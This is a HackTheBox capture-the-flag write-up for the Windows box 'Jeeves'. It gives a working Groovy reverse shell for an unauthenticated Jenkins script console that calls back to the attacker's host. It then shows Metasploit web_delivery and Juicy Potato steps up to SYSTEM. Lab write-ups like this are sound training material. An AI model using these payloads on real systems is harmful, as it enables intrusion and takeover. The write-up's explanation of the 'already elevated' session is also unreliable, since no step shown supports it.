---
title: "Jeeves - HackTheBox Writeup"
date: 2026-04-23 00:00:00 +0000
categories: [boxes]
tags: [hackthebox, windows, medium, jenkins, groovy, seimpersonateprivilege, juicypotato]
image:
  path: /assets/img/box/18/logo.png
  alt: Jeeves HackTheBox Machine
img_path: /assets/img/box/18/
---

![Machine Info](https://img.shields.io/badge/Difficulty-Medium-yellow) ![Machine Info](https://img.shields.io/badge/OS-Windows-blue)

<p align="center"> <img src="/assets/img/box/18/logo.png" width="150" alt="Jeeves Logo"/> </p>

**Platform:** HackTheBox
**OS:** Windows
**Difficulty:** Medium
**Author:** al3xxv

---

## Enumeration

### Nmap

```bash
nmap -sCV 10.129.228.112
```

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Two HTTP servers are exposed — IIS on port 80 and Jetty on port 50000. Port 80 shows an "Ask Jeeves" search page but has nothing exploitable. Port 50000 returns a 404, so we enumerate further.

### Gobuster

```bash
gobuster dir -u http://10.129.228.112:50000/ \
  -w /seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -t 45
```

```
askjeeves    (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
```

---

## Foothold — Jenkins Script Console RCE

Navigating to `http://10.129.228.112:50000/askjeeves/` reveals a **Jenkins** instance with no authentication required.

![Jenkins Dashboard](/assets/img/box/18/poc1.png)

Jenkins ships with a **Script Console** (`/script`) that executes arbitrary **Groovy** code server-side. After some enumeration we reach it at:

```
http://10.129.228.112:50000/askjeeves/script
```

We use a Groovy reverse shell to get a foothold:

![Jenkins Script Console — Groovy Reverse Shell](/assets/img/box/18/poc2.png)

```groovy
String host = "10.10.14.158";
int port = 4444;
String cmd = "cmd.exe";
Process p = new ProcessBuilder([cmd]).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
    try { p.exitValue(); break; } catch (Exception e) {}
}
p.destroy(); s.close();
```

After catching the shell, we confirm our identity:

```
C:\Users\Administrator\.jenkins> whoami
jeeves\kohsuke
```

---

## Privilege Escalation

### Token Privileges Enumeration

```
C:\Users\Administrator\.jenkins> whoami /priv

SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

`SeImpersonatePrivilege` is enabled — a classic path to SYSTEM via token impersonation.

### Upgrading to Meterpreter

We use Metasploit's `web_delivery` module to migrate to a Meterpreter session, which gives us access to post-exploitation modules:

```
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(web_delivery) > set TARGET 2   # PowerShell
msf6 exploit(web_delivery) > set LHOST 10.10.14.158
msf6 exploit(web_delivery) > run
```

Paste the generated PowerShell one-liner into the existing shell. Once the session opens:

```
meterpreter > sysinfo

Computer        : JEEVES
OS              : Windows 10 1511 (10.0 Build 10586).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

### Local Exploit Suggester

```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(local_exploit_suggester) > set SESSION 1
msf6 post(local_exploit_suggester) > run

[+] 10.129.228.112 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
```

**MS16-075 (Juicy Potato / Reflection)** is flagged as viable.

### MS16-075 — Juicy Potato

```
msf6 > use exploit/windows/local/ms16_075_reflection_juicy
msf6 exploit(ms16_075_reflection_juicy) > set SESSION 1
msf6 exploit(ms16_075_reflection_juicy) > set LHOST 10.10.14.158
msf6 exploit(ms16_075_reflection_juicy) > set LPORT 5555
msf6 exploit(ms16_075_reflection_juicy) > run
```

```
[-] Exploit aborted due to failure: none: Session is already elevated
```

The exploit reports the session is already elevated — meaning our token impersonation worked at the OS level even before running the exploit. We switch back to session 1 and drop into a shell to confirm:

```
msf6 exploit(ms16_075_reflection_juicy) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell

Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins> whoami
nt authority\system
```

**We are SYSTEM.**
